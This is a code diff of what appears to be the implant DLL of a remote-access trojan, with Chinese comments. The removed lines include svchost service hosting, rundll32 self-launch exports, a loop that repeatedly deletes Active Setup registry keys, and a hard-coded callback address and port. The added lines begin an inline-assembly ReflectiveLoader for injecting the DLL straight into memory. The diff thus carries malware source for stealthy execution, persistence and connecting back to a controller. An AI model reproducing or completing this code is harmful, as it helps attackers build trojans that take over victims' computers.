@@ -18,12 +18,9 @@ struct Connect_Address
 }g_myAddress = { 0xCC28256,"",0,"" };
 
 
-DWORD WINAPI DelAXRegThread(LPVOID lpParam);
-
 char	svcname[MAX_PATH];
 SERVICE_STATUS_HANDLE hServiceStatus;
 DWORD	g_dwCurrState;
-
 
 char g_strSvchostName[MAX_PATH];//服务名
 char g_strHost[MAX_PATH];
@@ -220,74 +217,7 @@ BOOL APIENTRY DllMain( HMODULE hModule,
     return TRUE;
 }
 
-int TellSCM(DWORD dwState, DWORD dwExitCode, DWORD dwProgress)
-{
-	SERVICE_STATUS srvStatus;
-	srvStatus.dwServiceType = SERVICE_WIN32_SHARE_PROCESS;
-	srvStatus.dwCurrentState = g_dwCurrState = dwState;
-	srvStatus.dwControlsAccepted = SERVICE_ACCEPT_STOP | SERVICE_ACCEPT_SHUTDOWN;
-	srvStatus.dwWin32ExitCode = dwExitCode;
-	srvStatus.dwServiceSpecificExitCode = 0;
-	srvStatus.dwCheckPoint = dwProgress;
-	srvStatus.dwWaitHint = 1000;
-	return SetServiceStatus(hServiceStatus, &srvStatus);
-}
 
-void __stdcall ServiceHandler(DWORD    dwControl)
-{
-	// not really necessary because the service stops quickly
-	switch (dwControl)
-	{
-	case SERVICE_CONTROL_STOP:
-		TellSCM(SERVICE_STOP_PENDING, 0, 1);
-		Sleep(10);
-		TellSCM(SERVICE_STOPPED, 0, 0);
-		break;
-	case SERVICE_CONTROL_PAUSE:
-		TellSCM(SERVICE_PAUSE_PENDING, 0, 1);
-		TellSCM(SERVICE_PAUSED, 0, 0);
-		break;
-	case SERVICE_CONTROL_CONTINUE:
-		TellSCM(SERVICE_CONTINUE_PENDING, 0, 1);
-		TellSCM(SERVICE_RUNNING, 0, 0);
-		break;
-	case SERVICE_CONTROL_INTERROGATE:
-		TellSCM(g_dwCurrState, 0, 0);
-		break;
-	}
-}
-
-
-extern "C" __declspec(dllexport) void ServiceMain(int argc, wchar_t* argv[])
-{
-	strncpy(svcname, (char*)argv[0], sizeof svcname); //it's should be unicode, but if it's ansi we do it well
-	wcstombs(svcname, argv[0], sizeof svcname);
-	hServiceStatus = RegisterServiceCtrlHandler(svcname, (LPHANDLER_FUNCTION)ServiceHandler);
-	if (hServiceStatus == NULL)
-	{
-		return;
-	}
-	else FreeConsole();
-
-	TellSCM(SERVICE_START_PENDING, 0, 1);
-	TellSCM(SERVICE_RUNNING, 0, 0);
-	// call Real Service function noew
-
-	g_dwServiceType = QueryServiceTypeFromRegedit(svcname);
-	HANDLE hThread = MyCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)main, (LPVOID)svcname, 0, NULL);
-	do {
-		Sleep(100);//not quit until receive stop command, otherwise the service will stop
-	} while (g_dwCurrState != SERVICE_STOP_PENDING && g_dwCurrState != SERVICE_STOPPED);
-	WaitForSingleObject(hThread, INFINITE);
-	CloseHandle(hThread);
-
-	if (g_dwServiceType == 0x120)
-	{
-		//Shared的服务 ServiceMain 不退出，不然一些系统上svchost进程也会退出
-		while (1) Sleep(10000);
-	}
-	return;
-}
 
 extern "C" __declspec(dllexport) void TestFun(char* strHost, int nPort)
 {
@@ -299,75 +229,41 @@ extern "C" __declspec(dllexport) void TestFun(char* strHost, int nPort)
 	CloseHandle(hThread);
 }
 
-void TestFuns(char* strHost, int nPort)
+
+
+inline DWORD GetCurrentPositionAddress()
 {
-	strcpy(g_strHost, strHost);   // 保存上线地址
-	g_dwPort = nPort;             // 保存上线端口
-	HANDLE hThread = MyCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)main, (LPVOID)g_strHost, 0, NULL);
-	//这里等待线程结束
-	WaitForSingleObject(hThread, INFINITE);
-	CloseHandle(hThread);
-}
-
-
-extern "C" __declspec(dllexport) void MainRun(HWND hwnd, HINSTANCE hinst, LPSTR lpCmdLine, int nCmdShow)
-{
-	MyCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)DelAXRegThread, NULL, 0, NULL);
-	char strHost[] = "127.0.0.1";          // 声明上线地址
-	int  nPort = 8088;                     // 声明上线端口
-	TestFuns(strHost, nPort);
-}
-
-extern "C" __declspec(dllexport) void FirstRun(HWND hwnd, HINSTANCE hinst, LPSTR lpCmdLine, int nCmdShow)
-{
-	char strMyFileName[MAX_PATH], strCmdLine[MAX_PATH];
-	ZeroMemory(strMyFileName, MAX_PATH);
-	ZeroMemory(strCmdLine, MAX_PATH);
-	//得到自身文件名
-	GetModuleFileName(CKeyboardManager::g_hInstance, strMyFileName, MAX_PATH);
-	//构造启动参数
-	sprintf(strCmdLine, "%s %s,MainRun", "rundll32.exe", strMyFileName);
-
-	//启动服务端
-	STARTUPINFO StartInfo;
-	PROCESS_INFORMATION ProcessInformation;
-	StartInfo.cb = sizeof(STARTUPINFO);
-	StartInfo.lpDesktop = NULL;
-	StartInfo.lpReserved = NULL;
-	StartInfo.lpTitle = NULL;
-	StartInfo.dwFlags = STARTF_USESHOWWINDOW;
-	StartInfo.cbReserved2 = 0;
-	StartInfo.lpReserved2 = NULL;
-	StartInfo.wShowWindow = SW_SHOWNORMAL;
-	BOOL bReturn = CreateProcess(NULL, strCmdLine, NULL, NULL, FALSE, NULL, NULL, NULL, &StartInfo, &ProcessInformation);
-
-}
-
-
-
-DWORD WINAPI DelAXRegThread(LPVOID lpParam)
-{
-	char ActiveXStr[1024];             // activex 键值字符串
-	char ActiveXStr32[1024];           // activex 键值字符串
-	ZeroMemory(ActiveXStr, 1024);
-	ZeroMemory(ActiveXStr32, 1024);
-
-	if (g_myAddress.ActiveXKeyGuid != NULL)
-	{
-		//构造键值
-		sprintf(ActiveXStr, "%s%s", "Software\\Microsoft\\Active Setup\\Installed Components\\", g_myAddress.ActiveXKeyGuid);
-		sprintf(ActiveXStr32, "%s%s", "Software\\Wow6432Node\\Microsoft\\Active Setup\\Installed Components\\", g_myAddress.ActiveXKeyGuid);
-		while (1)
-		{
-			//不停的删除注册表
-			RegDeleteKey(HKEY_CURRENT_USER, ActiveXStr);
-			OutputDebugString(ActiveXStr);      // 输出删除的字串用以测试
-			RegDeleteKey(HKEY_CURRENT_USER, ActiveXStr32);
-			OutputDebugString(ActiveXStr32);  
-			Sleep(1000 * 30);
-		}
+	_asm{
+		push    ebp
+		mov     ebp, esp
+		mov     eax, [ebp + 4]
+		pop     ebp
+		retn
 	}
-	return 0;
+}
+
+extern "C" __declspec(dllexport) void ReflectiveLoader()
+{
+	_asm{
+		push    ebp
+		mov     ebp, esp
+		sub     esp, 0x64
+		mov		[ebp + 0x40], 0
+		mov		[ebp + 0x44], 0
+		mov		[ebp + 0x38], 0
+		mov		[ebp + 0x54], 0
+		mov		[ebp + 0x48], 0
+		mov		[ebp + 0x50], 0
+		mov		[ebp + 0x4c], 0
+		call    GetCurrentPositionAddress //获取当前位置地址
+		mov		[ebp + 0x04], eax //地址保存
+
+
+	}
 
 }
+
+
+
+
 
